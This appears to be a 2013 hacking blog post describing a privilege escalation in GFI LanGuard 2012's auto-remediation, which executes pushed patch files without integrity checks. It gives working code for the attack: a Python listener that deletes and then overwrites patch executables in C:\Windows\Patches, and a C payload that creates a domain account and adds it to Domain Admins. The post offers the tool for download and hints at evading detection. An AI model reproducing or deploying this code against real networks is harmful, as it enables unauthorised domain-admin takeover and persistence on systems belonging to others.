---
layout: splash
title: "GFI LanGuard 2012 Priviledge Escalation"
date: 2013-02-05 00:00:00 -0700
categories: Blog Tools
permalink: /:title.html
---
## Download

[https://github.com/RabbidByte/GFI2012-PrivilegeEscalation](https://github.com/RabbidByte/GFI2012-PrivilegeEscalation)

## What is GFI LanGuard 2012?
GFI LanGuard 2012 [http://www.gfi.com/network-security-vulnerability-scanner](http://www.gfi.com/network-security-vulnerability-scanner) is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.

LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.

In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at [http://www.gfi.com/network-security-vulnerability-scanner/manual](http://www.gfi.com/network-security-vulnerability-scanner/manual) Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.

## How it works
LanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.

When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.

Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.

Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.

The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.

## Requirements for Hack to be Successful
As previously mentioned there are some settings and requirements needed for this hack to work. So here they are.

1. Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.
2. The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.

![alt text](/assets/images/gfi/Login.png "Login")

## The Files
listener.py

```python
'''
Created on Dec 21, 2012
@author: RabbidByte (previously Essential Exploit Labs)
'''
import os, shutil
path="C:\\Windows\\Patches\\"
payload="payload.exe"
hook=0
files = []

dirList=os.listdir(path)
for fname in dirList:
    fileToDelete = path
    fileToDelete += fname
    os.remove(fileToDelete)
fname = None

while hook==0:
    dirList = None
    dirList=os.listdir(path)
    for fname in dirList:
        if fname.endswith(".exe"):
            if fname not in (files):
                files.append(fname)
    if len(files) > 1:
        print "We got the Files "
        print files[0]
        print "and "
        print files[1]
        print "Time to launch payload!"
        hook=1

fReplace = path
fReplace += files[0]
shutil.copy(payload, fReplace)
```

payload.c

```c
// payload.cpp 
// RabbidByte (previously Essential Exploit Labs)

#include "stdafx.h"
#include <Windows.h>

void exploit()
{
	system("net user admlnlstrator MyPassw0rd /add /domain");
	system("net group \"Domain Admins\" admlnlstrator /add /domain");
}

int _tmain(int argc, _TCHAR* argv[])
{
	exploit();
	return 0;
}
```

## NOTES
1. Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.
2. Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.
3. As always the author of this article is not responsible for how you use this information.